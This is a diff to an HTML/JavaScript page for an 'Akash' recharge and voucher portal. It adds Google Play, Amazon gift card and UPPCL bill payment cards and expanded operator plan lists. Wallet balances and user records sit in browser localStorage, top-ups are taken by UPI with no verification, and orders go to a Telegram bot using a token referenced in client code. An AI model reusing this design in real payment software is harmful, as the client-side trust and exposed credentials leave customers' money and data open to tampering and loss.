@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Akash Service Portal & Admin Panel</title>
+  <title>Akash All-In-One Multi Service Portal</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
     body { background: #f0f2f5; padding: 15px; }
@@ -11,7 +11,7 @@
     header { background: #007bff; color: white; padding: 15px 20px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
     .wallet-box { background: #138496; padding: 8px 15px; border-radius: 20px; font-weight: bold; }
 
-    .main-container { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+    .main-container { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
     .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.08); text-align: left; }
     .card h3 { color: #333; margin-bottom: 15px; border-bottom: 2px solid #007bff; padding-bottom: 5px; }
 
@@ -21,6 +21,9 @@
     .btn { width: 100%; margin-top: 15px; padding: 12px; border: none; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; color: white; }
     .btn-buy { background: #28a745; }
     .btn-add { background: #007bff; }
+    .btn-bill { background: #ff9800; }
+    .btn-play { background: #ea4335; }
+    .btn-amazon { background: #232f3e; color: #ff9900; }
     .btn-admin { background: #dc3545; }
 
     .comm-tag { background: #e8f5e9; color: #2e7d32; padding: 8px; border-radius: 4px; font-size: 12px; font-weight: bold; margin-top: 8px; }
@@ -38,14 +41,14 @@
 <body>
 
   <header>
-    <h2>Akash Portal</h2>
+    <h2>Akash Service Store (All-In-One)</h2>
     <div class="wallet-box">Balance: ₹<span id="user-balance">0</span></div>
   </header>
 
-  <!-- 1. REGISTRATION & LOGIN SECTION -->
+  <!-- 1. AUTHENTICATION SECTION -->
   <div id="auth-section" class="main-container">
     <div class="card">
-      <h3>📝 Registration (Get ₹10 Bonus)</h3>
+      <h3>📝 User Registration (Get ₹10 Bonus)</h3>
       <label>Full Name</label>
       <input type="text" id="reg-name" placeholder="Enter Full Name">
 
@@ -68,7 +71,7 @@
       </p>
     </div>
 
-    <!-- Login Card -->
+    <!-- Login Form -->
     <div class="card" id="login-card" style="display:none;">
       <h3>🔐 User Login</h3>
       <label>Email ID</label>
@@ -78,7 +81,7 @@
       <button class="btn btn-buy" onclick="loginUser()">Login Portal</button>
     </div>
 
-    <!-- Admin Login Card -->
+    <!-- Admin Login -->
     <div class="card" id="admin-login-card" style="display:none;">
       <h3>⚙️ Admin Login Panel</h3>
       <label>Admin Username</label>
@@ -89,10 +92,10 @@
     </div>
   </div>
 
-  <!-- 2. MAIN USER DASHBOARD -->
+  <!-- 2. MAIN USER PORTAL -->
   <div id="portal-section" class="main-container">
     
-    <!-- ADD BALANCE CARD -->
+    <!-- ADD BALANCE -->
     <div class="card">
       <h3>💳 Add Money To Wallet</h3>
       <div class="upi-badge">UPI: rameshchandra908080@okaxis</div>
@@ -106,14 +109,14 @@
       <button class="btn btn-add" onclick="startAutoAddBalance()">Pay & Add Balance</button>
 
       <div id="qr-modal">
-        <p style="font-size:12px; font-weight:bold; color:#d32f2f;">UPI App Open Nahi Hua? QR Scan Karein:</p>
+        <p style="font-size:12px; font-weight:bold; color:#d32f2f;">App Open Nahi Hua? QR Scan Karein:</p>
         <img id="dynamic-qr" src="" alt="Scan QR">
       </div>
     </div>
 
-    <!-- BUY RECHARGE CARD -->
+    <!-- ALL MOBILE RECHARGES -->
     <div class="card">
-      <h3>📱 Buy Mobile Recharge</h3>
+      <h3>📱 Mobile Recharge</h3>
       <label>Mobile Number</label>
       <input type="number" id="buy-number" placeholder="10 Digit Number">
 
@@ -129,12 +132,63 @@
 
       <div class="comm-tag" id="commission-info">MRP: ₹0 | Cashback: ₹0</div>
       <button class="btn btn-buy" onclick="buyPlan()">Proceed Recharge</button>
-      <button class="btn btn-admin" style="margin-top:10px;" onclick="logout()">Logout</button>
     </div>
 
-    <!-- TRANSACTION & RECHARGE HISTORY CARD -->
+    <!-- GOOGLE PLAY REDEEM CODE -->
+    <div class="card">
+      <h3>🎮 Google Play Redeem Code</h3>
+      <label>Mobile Number (For Code Delivery)</label>
+      <input type="number" id="gplay-mobile" placeholder="10 Digit Number">
+
+      <label>Amount (₹10 - ₹5000)</label>
+      <input type="number" id="gplay-amt" placeholder="e.g. 10, 50, 100, 500">
+
+      <button class="btn btn-play" onclick="buyGooglePlayCode()">Buy Redeem Code</button>
+    </div>
+
+    <!-- AMAZON GIFT CARD -->
+    <div class="card">
+      <h3>🛒 Amazon Gift Card</h3>
+      <label>Mobile Number / Email</label>
+      <input type="text" id="amz-contact" placeholder="Mobile Number or Email">
+
+      <label>Select Voucher Amount</label>
+      <select id="amz-amt">
+        <option value="50">₹50 Gift Card</option>
+        <option value="100">₹100 Gift Card</option>
+        <option value="250">₹250 Gift Card</option>
+        <option value="500">₹500 Gift Card</option>
+        <option value="1000">₹1000 Gift Card</option>
+      </select>
+
+      <button class="btn btn-amazon" onclick="buyAmazonGiftCard()">Buy Amazon Gift Voucher</button>
+    </div>
+
+    <!-- UPPCL LIGHT BILL PAYMENT -->
+    <div class="card">
+      <h3>💡 UPPCL Electricity Bill Pay</h3>
+      <label>UPPCL Region</label>
+      <select id="uppcl-discom">
+        <option value="UPPCL Urban">UPPCL Urban (Urban - Shehar)</option>
+        <option value="UPPCL Rural">UPPCL Rural (Rural - Dehat)</option>
+      </select>
+
+      <label>Account No / Consumer ID</label>
+      <input type="text" id="uppcl-acc" placeholder="10 or 12 Digit Account Number">
+
+      <label>Consumer Name</label>
+      <input type="text" id="uppcl-name" placeholder="Consumer Full Name">
+
+      <label>Bill Amount (₹)</label>
+      <input type="number" id="uppcl-amt" placeholder="Enter Bill Amount">
+
+      <button class="btn btn-bill" onclick="payUppclBill()">Pay Bill Now</button>
+      <button class="btn btn-admin" style="margin-top:10px;" onclick="logout()">Logout Portal</button>
+    </div>
+
+    <!-- HISTORY LOG -->
     <div class="card" style="grid-column: span 2;">
-      <h3>📜 Balance & Recharge History</h3>
+      <h3>📜 Balance, Recharge & Order History</h3>
       <table class="admin-table">
         <thead>
           <tr>
@@ -144,9 +198,7 @@
             <th>Time</th>
           </tr>
         </thead>
-        <tbody id="user-history-body">
-          <!-- History rows will load here -->
-        </tbody>
+        <tbody id="user-history-body"></tbody>
       </table>
     </div>
 
@@ -178,10 +230,42 @@
     const UPI_ID = "rameshchandra908080@okaxis";
 
     const commissionRates = { Jio: 2.0, Airtel: 1.5, Vi: 2.5 };
+    
     const operatorPlans = {
-      Jio: [{ label: "₹299 - 1.5GB/Day (28 Days)", price: 299 }, { label: "₹19 - 1GB Data", price: 19 }],
-      Airtel: [{ label: "₹299 - 1.5GB/Day (28 Days)", price: 299 }],
-      Vi: [{ label: "₹299 - 1.5GB/Day (28 Days)", price: 299 }]
+      Jio: [
+        { label: "₹19 - 1GB Data Booster", price: 19 },
+        { label: "₹29 - 2GB Data Booster", price: 29 },
+        { label: "₹199 - 1.5GB/Day (18 Days)", price: 199 },
+        { label: "₹239 - 1.5GB/Day (22 Days)", price: 239 },
+        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 },
+        { label: "₹349 - 2GB/Day (28 Days)", price: 349 },
+        { label: "₹666 - 1.5GB/Day (70 Days)", price: 666 },
+        { label: "₹749 - 2GB/Day (72 Days)", price: 749 },
+        { label: "₹899 - 2GB/Day (90 Days)", price: 899 },
+        { label: "₹2999 - 2.5GB/Day (365 Days)", price: 2999 }
+      ],
+      Airtel: [
+        { label: "₹22 - 1GB Data Booster", price: 22 },
+        { label: "₹33 - 2GB Data Booster", price: 33 },
+        { label: "₹199 - 1GB/Day (24 Days)", price: 199 },
+        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 },
+        { label: "₹349 - 1.5GB/Day (28 Days + Perks)", price: 349 },
+        { label: "₹409 - 2.5GB/Day (28 Days)", price: 409 },
+        { label: "₹579 - 1.5GB/Day (56 Days)", price: 579 },
+        { label: "₹859 - 1.5GB/Day (84 Days)", price: 859 },
+        { label: "₹979 - 2GB/Day (84 Days)", price: 979 },
+        { label: "₹3599 - 2GB/Day (365 Days)", price: 3599 }
+      ],
+      Vi: [
+        { label: "₹19 - 1GB Data (1 Day)", price: 19 },
+        { label: "₹23 - 1.2GB Data", price: 23 },
+        { label: "₹199 - 1GB/Day (18 Days)", price: 199 },
+        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 },
+        { label: "₹349 - 1.5GB/Day (28 Days Unlimited)", price: 349 },
+        { label: "₹579 - 1.5GB/Day (56 Days)", price: 579 },
+        { label: "₹859 - 1.5GB/Day (84 Days)", price: 859 },
+        { label: "₹3499 - 1.5GB/Day (365 Days)", price: 3499 }
+      ]
     };
 
     let usersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
@@ -245,7 +329,6 @@
       const orderId = "ORD" + Date.now();
       const rawUpiUrl = `upi://pay?pa=${UPI_ID}&pn=AkashStore&tr=${orderId}&am=${amount}&cu=INR&tn=WalletTopup`;
 
-      // Add to user history log
       const timeNow = new Date().toLocaleString();
       currentUser.history.unshift({ type: "Add Money", details: `Topup Request (${mobile})`, amount: `+₹${amount}`, time: timeNow });
       updateUserDataStorage();
@@ -263,6 +346,126 @@
       document.getElementById("qr-modal").style.display = "block";
 
       window.location.href = rawUpiUrl;
+    }
+
+    function buyPlan() {
+      const num = document.getElementById("buy-number").value;
+      const op = document.getElementById("buy-operator").value;
+      const planSelect = document.getElementById("buy-plan");
+      const price = Number(planSelect.value);
+      const selectedText = planSelect.options[planSelect.selectedIndex].text;
+
+      if(!num || num.length !== 10) { alert("Valid Number Enter Karein!"); return; }
+      if(currentUser.balance < price) { alert("Wallet me balance kam hai!"); return; }
+
+      currentUser.balance -= price;
+      document.getElementById("user-balance").innerText = currentUser.balance;
+      
+      const timeNow = new Date().toLocaleString();
+      if(!currentUser.history) currentUser.history = [];
+      currentUser.history.unshift({ type: "Recharge", details: `${op} - ${selectedText} (${num})`, amount: `-₹${price}`, time: timeNow });
+      
+      updateUserDataStorage();
+
+      const msg = `🛒 *RECHARGE PURCHASED*\n\n👤 *User:* ${currentUser.name}\n📱 *Number:* ${num}\n🏢 *Operator:* ${op}\n📦 *Plan:* ${selectedText}\n💵 *Price:* ₹${price}\n⏰ *Time:* ${timeNow}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+      });
+
+      alert("Recharge Order Placed Successfully!");
+      document.getElementById("buy-number").value = "";
+    }
+
+    function buyGooglePlayCode() {
+      const mob = document.getElementById("gplay-mobile").value;
+      const amt = Number(document.getElementById("gplay-amt").value);
+
+      if(!mob || mob.length !== 10 || !amt || amt < 10) {
+        alert("Valid Mobile Number aur min ₹10 amount daalein!");
+        return;
+      }
+
+      if(currentUser.balance < amt) { alert("Wallet Balance Kam Hai!"); return; }
+
+      currentUser.balance -= amt;
+      document.getElementById("user-balance").innerText = currentUser.balance;
+
+      const timeNow = new Date().toLocaleString();
+      if(!currentUser.history) currentUser.history = [];
+      currentUser.history.unshift({ type: "Google Play Code", details: `Redeem Code (${mob})`, amount: `-₹${amt}`, time: timeNow });
+
+      updateUserDataStorage();
+
+      const msg = `🎮 *GOOGLE PLAY REDEEM CODE REQUEST*\n\n👤 *User:* ${currentUser.name}\n📱 *Mobile:* ${mob}\n💵 *Amount:* ₹${amt}\n⏰ *Time:* ${timeNow}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+      });
+
+      alert("Google Play Code Request Sent Successfully!");
+      document.getElementById("gplay-mobile").value = "";
+      document.getElementById("gplay-amt").value = "";
+    }
+
+    function buyAmazonGiftCard() {
+      const contact = document.getElementById("amz-contact").value;
+      const amt = Number(document.getElementById("amz-amt").value);
+
+      if(!contact) { alert("Mobile ya Email ID enter karein!"); return; }
+      if(currentUser.balance < amt) { alert("Wallet Balance Kam Hai!"); return; }
+
+      currentUser.balance -= amt;
+      document.getElementById("user-balance").innerText = currentUser.balance;
+
+      const timeNow = new Date().toLocaleString();
+      if(!currentUser.history) currentUser.history = [];
+      currentUser.history.unshift({ type: "Amazon Voucher", details: `Gift Voucher (${contact})`, amount: `-₹${amt}`, time: timeNow });
+
+      updateUserDataStorage();
+
+      const msg = `🛒 *AMAZON GIFT CARD REQUEST*\n\n👤 *User:* ${currentUser.name}\n📱 *Contact:* ${contact}\n💵 *Voucher Amount:* ₹${amt}\n⏰ *Time:* ${timeNow}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+      });
+
+      alert("Amazon Gift Card Order Sent Successfully!");
+      document.getElementById("amz-contact").value = "";
+    }
+
+    function payUppclBill() {
+      const discom = document.getElementById("uppcl-discom").value;
+      const acc = document.getElementById("uppcl-acc").value;
+      const name = document.getElementById("uppcl-name").value;
+      const amt = Number(document.getElementById("uppcl-amt").value);
+
+      if(!acc || !name || !amt || amt < 1) { alert("UPPCL Bill details sahi se bharein!"); return; }
+      if(currentUser.balance < amt) { alert("Wallet balance kam hai!"); return; }
+
+      currentUser.balance -= amt;
+      document.getElementById("user-balance").innerText = currentUser.balance;
+
+      const timeNow = new Date().toLocaleString();
+      if(!currentUser.history) currentUser.history = [];
+      currentUser.history.unshift({ type: "Electricity Bill", details: `${discom} - Acc: ${acc} (${name})`, amount: `-₹${amt}`, time: timeNow });
+
+      updateUserDataStorage();
+
+      const msg = `💡 *UPPCL LIGHT BILL REQUEST*\n\n👤 *User:* ${currentUser.name}\n🏢 *Type:* ${discom}\n🆔 *Account No:* \`${acc}\`\n👤 *Consumer:* ${name}\n💵 *Bill Amount:* ₹${amt}\n⏰ *Time:* ${timeNow}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+      });
+
+      alert("UPPCL Bill Payment Request Sent Successfully!");
+      document.getElementById("uppcl-acc").value = "";
+      document.getElementById("uppcl-name").value = "";
+      document.getElementById("uppcl-amt").value = "";
     }
 
     function loginAdmin() {
@@ -384,40 +587,6 @@
       const commPercent = commissionRates[op] || 0;
       const commAmount = (price * commPercent / 100).toFixed(2);
       document.getElementById("commission-info").innerText = `MRP: ₹${price} | Cashback Earned: ₹${commAmount}`;
-    }
-
-    function buyPlan() {
-      const num = document.getElementById("buy-number").value;
-      const op = document.getElementById("buy-operator").value;
-      const planSelect = document.getElementById("buy-plan");
-      const price = Number(planSelect.value);
-      const selectedText = planSelect.options[planSelect.selectedIndex].text;
-
-      if(!num || num.length !== 10) { alert("Valid Number Enter Karein!"); return; }
-
-      if(currentUser.balance < price) {
-        alert("Wallet me balance kam hai! Pehle Add Balance card se paise add karein.");
-        return;
-      }
-
-      currentUser.balance -= price;
-      document.getElementById("user-balance").innerText = currentUser.balance;
-      
-      const timeNow = new Date().toLocaleString();
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.unshift({ type: "Recharge", details: `${op} - ${selectedText} (${num})`, amount: `-₹${price}`, time: timeNow });
-      
-      updateUserDataStorage();
-
-      const msg = `🛒 *RECHARGE PURCHASED*\n\n👤 *User:* ${currentUser.name}\n📱 *Number:* ${num}\n🏢 *Operator:* ${op}\n💵 *Price:* ₹${price}\n⏰ *Time:* ${timeNow}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-      });
-
-      alert("Recharge Order Placed Successfully!");
-      document.getElementById("buy-number").value = "";
     }
   </script>
 </body>
